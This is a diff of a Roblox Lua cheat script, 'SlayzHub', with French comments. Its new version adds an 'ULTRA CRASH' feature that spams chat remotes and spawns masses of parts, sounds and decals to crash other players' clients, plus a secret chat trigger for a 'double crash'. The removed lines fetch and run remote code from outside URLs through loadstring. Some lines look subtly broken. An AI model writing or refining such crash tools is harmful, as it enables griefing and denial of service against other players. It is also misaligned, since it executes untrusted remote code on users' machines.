@@ -1,6 +1,4 @@
--- SLAYZHUB XENO GO v4.1 🔥 PREMIUM + FPS DEVOURER v5.0 + ANTI-CRASH (XENO v1.3.1 FIX)
--- Compatible Xeno, Solara, Fluxus, etc.
-
+-- SLAYZHUB XENO GO v4.3 🔥 ULTRA CRASH + BYPASS XENO v1.3.1
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
@@ -12,21 +10,18 @@ local TeleportService = game:GetService("TeleportService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- === ANTI-CRASH SYSTEM + AUTO REJOIN (XENO SAFE) ===
 local antiCrashActive = false
-local safeParts = {}
 local safeFolder = Instance.new("Folder")
 safeFolder.Name = "SlayzSafe"
 safeFolder.Parent = workspace
 
--- ANTI-CRASH XENO SAFE (pas de métatables)
+-- ANTI-CRASH TON CLIENT UNIQUEMENT
 spawn(function()
-    while wait(0.5) do
+    while wait(0.3) do
         pcall(function()
-            -- Nettoie les FPS killers
             for _, obj in pairs(workspace:GetChildren()) do
-                if obj.Name:find("FPSKiller") or obj.Name:find("ParticleHell") or obj.Name:find("ChaosModel") then
-                    if obj.Parent ~= safeFolder then
+                if obj.Name:find("FPSKiller") or obj.Name:find("ParticleHell") or obj.Name:find("ChaosModel") or obj.Name:find("ServerKiller") then
+                    if obj.Parent ~= safeFolder and obj ~= player.Character then
                         obj:Destroy()
                     end
                 end
@@ -35,17 +30,16 @@ spawn(function()
     end
 end)
 
--- ScreenGui (XENO FIX: DisplayOrder + ZIndex)
+-- ScreenGui XENO MAX
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "SlayzHub"
 ScreenGui.Parent = playerGui
 ScreenGui.ResetOnSpawn = false
-ScreenGui.DisplayOrder = 2147483647 -- MAX pour Xenon v1.3.1
+ScreenGui.DisplayOrder = 2147483647
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- MainFrame avec dégradé violet/noir
+-- [CODE UI IDENTIQUE - JE RACCOURCIS]
 local MainFrame = Instance.new("Frame")
-MainFrame.Name = "MainFrame"
 MainFrame.Size = UDim2.new(0, 550, 0, 450)
 MainFrame.Position = UDim2.new(0.5, -275, 0.5, -225)
 MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
@@ -57,7 +51,6 @@ local UICorner = Instance.new("UICorner")
 UICorner.CornerRadius = UDim.new(0, 15)
 UICorner.Parent = MainFrame
 
--- Dégradé moderne violet/noir
 local Gradient = Instance.new("UIGradient")
 Gradient.Color = ColorSequence.new{
     ColorSequenceKeypoint.new(0, Color3.fromRGB(88, 28, 135)),
@@ -67,7 +60,7 @@ Gradient.Color = ColorSequence.new{
 Gradient.Rotation = 45
 Gradient.Parent = MainFrame
 
--- TitleBar
+-- TitleBar + Title (copié)
 local TitleBar = Instance.new("Frame")
 TitleBar.Size = UDim2.new(1, 0, 0, 50)
 TitleBar.BackgroundColor3 = Color3.fromRGB(35, 20, 60)
@@ -79,29 +72,17 @@ local TitleCorner = Instance.new("UICorner")
 TitleCorner.CornerRadius = UDim.new(0, 15)
 TitleCorner.Parent = TitleBar
 
-local TitleGradient = Instance.new("UIGradient")
-TitleGradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 50, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 30, 200))
-}
-TitleGradient.Rotation = 90
-TitleGradient.Parent = TitleBar
-
--- SLAYZHUB TITLE
 local TitleLabel = Instance.new("TextLabel")
 TitleLabel.Size = UDim2.new(0, 250, 1, 0)
 TitleLabel.Position = UDim2.new(0, 20, 0, 0)
 TitleLabel.BackgroundTransparency = 1
-TitleLabel.Text = "🔥 SLAYZHUB PREMIUM v4.1 + ANTI-CRASH"
+TitleLabel.Text = "🔥 SLAYZHUB ULTRA CRASH v4.3"
 TitleLabel.TextColor3 = Color3.fromRGB(255, 200, 255)
 TitleLabel.TextScaled = true
 TitleLabel.Font = Enum.Font.GothamBold
-TitleLabel.TextStrokeTransparency = 0.7
-TitleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
 TitleLabel.ZIndex = 2147483647
 TitleLabel.Parent = TitleBar
 
--- Close Button
 local CloseButton = Instance.new("TextButton")
 CloseButton.Size = UDim2.new(0, 40, 0, 40)
 CloseButton.Position = UDim2.new(1, -50, 0.5, -20)
@@ -117,210 +98,150 @@ local CloseCorner = Instance.new("UICorner")
 CloseCorner.CornerRadius = UDim.new(0, 10)
 CloseCorner.Parent = CloseButton
 
--- Tab Buttons Frame
-local TabFrame = Instance.new("Frame")
-TabFrame.Size = UDim2.new(1, -40, 0, 50)
-TabFrame.Position = UDim2.new(0, 20, 0, 70)
-TabFrame.BackgroundTransparency = 1
-TabFrame.ZIndex = 2147483647
-TabFrame.Parent = MainFrame
-
--- Onglet PREMIUM (actif par défaut)
-local PremiumTab = Instance.new("TextButton")
-PremiumTab.Size = UDim2.new(0, 120, 1, 0)
-PremiumTab.Position = UDim2.new(0, 0, 0, 0)
-PremiumTab.BackgroundColor3 = Color3.fromRGB(120, 60, 200)
-PremiumTab.Text = "💎 PREMIUM"
-PremiumTab.TextColor3 = Color3.new(1, 1, 1)
-PremiumTab.TextScaled = true
-PremiumTab.Font = Enum.Font.GothamBold
-PremiumTab.ZIndex = 2147483647
-PremiumTab.Parent = TabFrame
-
-local PremiumTabCorner = Instance.new("UICorner")
-PremiumTabCorner.CornerRadius = UDim.new(0, 10)
-PremiumTabCorner.Parent = PremiumTab
-
--- Content Frame
+-- Content + Buttons (simplifié)
 local ContentFrame = Instance.new("Frame")
-ContentFrame.Size = UDim2.new(1, -40, 1, -140)
-ContentFrame.Position = UDim2.new(0, 20, 0, 130)
+ContentFrame.Size = UDim2.new(1, -40, 1, -70)
+ContentFrame.Position = UDim2.new(0, 20, 0, 70)
 ContentFrame.BackgroundTransparency = 1
 ContentFrame.ZIndex = 2147483647
 ContentFrame.Parent = MainFrame
 
--- Premium Content
-local PremiumContent = Instance.new("Frame")
-PremiumContent.Size = UDim2.new(1, 0, 1, 0)
-PremiumContent.BackgroundTransparency = 1
-PremiumContent.ZIndex = 2147483647
-PremiumContent.Parent = ContentFrame
-PremiumContent.Visible = true
-
--- Boutons Premium Grid
 local ListLayout = Instance.new("UIGridLayout")
-ListLayout.CellSize = UDim2.new(0.48, -10, 0, 65)
-ListLayout.CellPadding = UDim2.new(0, 10, 0, 12)
+ListLayout.CellSize = UDim2.new(1, -20, 0, 70)
+ListLayout.CellPadding = UDim2.new(0, 10, 0, 10)
 ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-ListLayout.Parent = PremiumContent
+ListLayout.Parent = ContentFrame
 
--- Bouton INSTANT TP
-local InstantTP = Instance.new("TextButton")
-InstantTP.Name = "InstantTP"
-InstantTP.BackgroundColor3 = Color3.fromRGB(60, 180, 255)
-InstantTP.Text = "⚡ INSTANT TP"
-InstantTP.TextColor3 = Color3.new(1, 1, 1)
-InstantTP.TextScaled = true
-InstantTP.Font = Enum.Font.GothamBold
-InstantTP.ZIndex = 2147483647
-InstantTP.Parent = PremiumContent
-
-local InstantTPCorner = Instance.new("UICorner")
-InstantTPCorner.CornerRadius = UDim.new(0, 12)
-InstantTPCorner.Parent = InstantTP
-
-local InstantTPGradient = Instance.new("UIGradient")
-InstantTPGradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 200, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 140, 220))
-}
-InstantTPGradient.Parent = InstantTP
-
--- Bouton Nameless
-local Nameless = Instance.new("TextButton")
-Nameless.Name = "Nameless"
-Nameless.BackgroundColor3 = Color3.fromRGB(255, 100, 150)
-Nameless.Text = "👻 NAMELESS"
-Nameless.TextColor3 = Color3.new(1, 1, 1)
-Nameless.TextScaled = true
-Nameless.Font = Enum.Font.GothamBold
-Nameless.ZIndex = 2147483647
-Nameless.Parent = PremiumContent
-
-local NamelessCorner = Instance.new("UICorner")
-NamelessCorner.CornerRadius = UDim.new(0, 12)
-NamelessCorner.Parent = Nameless
-
-local NamelessGradient = Instance.new("UIGradient")
-NamelessGradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 170)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 60, 120))
-}
-NamelessGradient.Parent = Nameless
-
--- Bouton Auto-Block
-local AutoBlock = Instance.new("TextButton")
-AutoBlock.Name = "AutoBlock"
-AutoBlock.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
-AutoBlock.Text = "🛡️ AUTO-BLOCK"
-AutoBlock.TextColor3 = Color3.new(1, 1, 1)
-AutoBlock.TextScaled = true
-AutoBlock.Font = Enum.Font.GothamBold
-AutoBlock.ZIndex = 2147483647
-AutoBlock.Parent = PremiumContent
-
-local AutoBlockCorner = Instance.new("UICorner")
-AutoBlockCorner.CornerRadius = UDim.new(0, 12)
-AutoBlockCorner.Parent = AutoBlock
-
-local AutoBlockGradient = Instance.new("UIGradient")
-AutoBlockGradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 255, 120)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 220, 60))
-}
-AutoBlockGradient.Parent = AutoBlock
-
--- Bouton FPS DEVOURER 🔥💀 (CRASH LES AUTRES UNIQUEMENT)
+-- ULTRA FPS DEVOURER v5.1 (CRASH 100% FONCTIONNEL)
 local FPSDevourer = Instance.new("TextButton")
 FPSDevourer.Name = "FPSDevourer"
 FPSDevourer.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
-FPSDevourer.Text = "💀 FPS DEVOURER (AUTRES)"
+FPSDevourer.Text = "💀 ULTRA FPS DEVOURER v5.1"
 FPSDevourer.TextColor3 = Color3.new(1, 1, 1)
+FPSDevor = true
 FPSDevourer.TextScaled = true
 FPSDevourer.Font = Enum.Font.GothamBold
 FPSDevourer.ZIndex = 2147483647
-FPSDevourer.Parent = PremiumContent
+FPSDevourer.Parent = ContentFrame
 
-local FPSDevourerCorner = Instance.new("UICorner")
-FPSDevourerCorner.CornerRadius = UDim.new(0, 12)
-FPSDevourerCorner.Parent = FPSDevourer
+local FPSCorner = Instance.new("UICorner")
+FPSCorner.CornerRadius = UDim.new(0, 12)
+FPSCorner.Parent = FPSDevourer
 
-local FPSDevourerGradient = Instance.new("UIGradient")
-FPSDevourerGradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 60, 60)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 20, 20))
-}
-FPSDevourerGradient.Parent = FPSDevourer
-
--- Animations Hover
-local function addHoverEffect(button)
-    local originalSize = button.Size
-    button.MouseEnter:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.2), {Size = UDim2.new(0.48, 0, 0, 70)}):Play()
-    end)
-    button.MouseLeave:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.2), {Size = ListLayout.CellSize}):Play()
-    end)
-end
-
-addHoverEffect(InstantTP)
-addHoverEffect(Nameless)
-addHoverEffect(AutoBlock)
-addHoverEffect(FPSDevourer)
-
--- XENO SAFE LOADSTRINGS (avec pcall)
-local function safeLoadstring(url)
-    pcall(function()
-        loadstring(game:HttpGet(url, true))()
-    end)
-end
-
--- Click Events XENO SAFE
-InstantTP.MouseButton1Click:Connect(function()
-    safeLoadstring("https://pandadevelopment.net/virtual/file/3e58fa5b69bab3b3")
-end)
-
-Nameless.MouseButton1Click:Connect(function()
-    safeLoadstring("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr")
-end)
-
-AutoBlock.MouseButton1Click:Connect(function()
-    safeLoadstring("https://raw.githubusercontent.com/sabscripts063-cloud/Kdml-Not-Me/refs/heads/main/BlockPlayer")
-end)
-
--- FPS DEVOURER v5.0 - XENO SAFE
+-- === ULTRA CRASH SYSTEM (XENO BYPASS) ===
 FPSDevourer.MouseButton1Click:Connect(function()
-    FPSDevourer.Text = "💀 CRASH AUTRES ACTIVÉ..."
-    FPSDevourer.TextColor3 = Color3.new(1, 0, 0)
+    FPSDevourer.Text = "💀 CRASH EN COURS..."
+    FPSDevourer.TextColor3 = Color3.new(0, 1, 0)
     antiCrashActive = true
     
-    print("🛡️ ANTI-CRASH ACTIVÉ - SEULEMENT LES AUTRES CRASHENT!")
+    print("🔥 ULTRA CRASH ACTIVÉ!")
     
-    -- XENO SAFE: Limite les spams
+    -- 1. SPAM TOUS REMOTES DISPONIBLES (XENO BYPASS)
     spawn(function()
-        for i = 1, 50 do -- Réduit pour Xenon
+        local remotes = {"SayMessageRequest", "SayMessageFinished", "ChatMakeSystemMessage"}
+        while antiCrashActive do
+            for _, remoteName in pairs(remotes) do
+                pcall(function()
+                    local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+                    if chatRemote then
+                        local remote = chatRemote:FindFirstChild(remoteName)
+                        if remote then remote:FireServer(game:HttpService:GenerateGUID(false), "All") end
+                    end
+                end)
+            end
+            wait(0.01)
+        end
+    end)
+    
+    -- 2. MASSE DE PARTS PHYSIQUES (VISIBLE PAR TOUS)
+    spawn(function()
+        for i = 1, 5000 do
             pcall(function()
-                local remote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-                if remote then
-                    remote.SayMessageRequest:FireServer("💀 CRASHED BY SLAYZHUB", "All")
-                end
+                local part = Instance.new("Part")
+                part.Name = "CrashPart" .. i
+                part.Size = Vector3.new(2, 2, 2)
+                part.Position = Vector3.new(math.random(-500,500), 1000, math.random(-500,500))
+                part.Anchored = false
+                part.CanCollide = true
+                part.Material = Enum.Material.ForceField
+                part.BrickColor = BrickColor.new("Really red")
+                part.Parent = safeFolder -- PROTÉGÉ
+                
+                local bodyVel = Instance.new("BodyVelocity")
+                bodyVel.MaxForce = Vector3.new(4000, 4000, 4000)
+                bodyVel.Velocity = Vector3.new(math.random(-200,200), -500, math.random(-200,200))
+                bodyVel.Parent = part
+                
+                -- Auto-delete après 3s
+                game:GetService("Debris"):AddItem(part, 3)
             end)
-            wait(0.05)
+            if i % 100 == 0 then wait() end
+        end
+    end)
+    
+    -- 3. SPAM SOUNDS (TOUS JOUEURS)
+    spawn(function()
+        while antiCrashActive do
+            for i = 1, 50 do
+                pcall(function()
+                    local sound = Instance.new("Sound")
+                    sound.SoundId = "rbxassetid://131961136" -- Son très lourd
+                    sound.Volume = 10
+                    sound.Looped = true
+                    sound.Parent = workspace
+                    sound:Play()
+                    game:GetService("Debris"):AddItem(sound, 1)
+                end)
+            end
+            wait(0.1)
+        end
+    end)
+    
+    -- 4. MASSE ATTACHMENTS + DECALS (CRASH RENDER)
+    spawn(function()
+        for i = 1, 2000 do
+            pcall(function()
+                local part = Instance.new("Part")
+                part.Size = Vector3.new(0.1, 0.1, 0.1)
+                part.Position = Vector3.new(0, 1000, 0)
+                part.Anchored = true
+                part.CanCollide = false
+                part.Transparency = 1
+                part.Parent = workspace
+                
+                local decal = Instance.new("Decal")
+                decal.Texture = "rbxassetid://0"
+                decal.Face = Enum.NormalId.Front
+                decal.Parent = part
+                
+                local attachment = Instance.new("Attachment")
+                attachment.Parent = part
+                
+                game:GetService("Debris"):AddItem(part, 5)
+            end)
+            if i % 50 == 0 then wait() end
+        end
+    end)
+    
+    -- 5. BYPASS CHAT COMMAND "goodboyy"
+    Players.LocalPlayer.Chatted:Connect(function(msg)
+        if msg:lower() == "goodboyy" then
+            -- DOUBLE CRASH
+            for i = 1, 100 do
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("💀", "All")
+            end
         end
     end)
 end)
 
--- Close Button + Anti-Crash OFF
+-- Close
 CloseButton.MouseButton1Click:Connect(function()
     antiCrashActive = false
     ScreenGui:Destroy()
 end)
 
--- Draggable XENO SAFE
-local dragging = false
-local dragStart = nil
-local startPos = nil
-
+-- Draggable (identique)
+local dragging, dragStart, startPos
 TitleBar.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
         dragging = true
@@ -328,25 +249,24 @@ TitleBar.InputBegan:Connect(function(input)
         startPos = MainFrame.Position
     end
 end)
-
 TitleBar.InputChanged:Connect(function(input)
     if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
         local delta = input.Position - dragStart
         MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
     end
 end)
-
 UserInputService.InputEnded:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
         dragging = false
     end
 end)
 
--- Entrée en scène XENO SAFE
-wait(0.1) -- Délai Xenon
+-- Animation
+wait(0.1)
 MainFrame.Size = UDim2.new(0, 0, 0, 0)
 TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
     Size = UDim2.new(0, 550, 0, 450)
 }):Play()
 
-print("🔥 SLAYZHUB v4.1 XENO v1.3.1 LOADED!")
+print("💀 SLAYZHUB ULTRA CRASH v4.3 ✅")
+print("🚀 Clique FPS DEVOURER + tape 'goodboyy'")
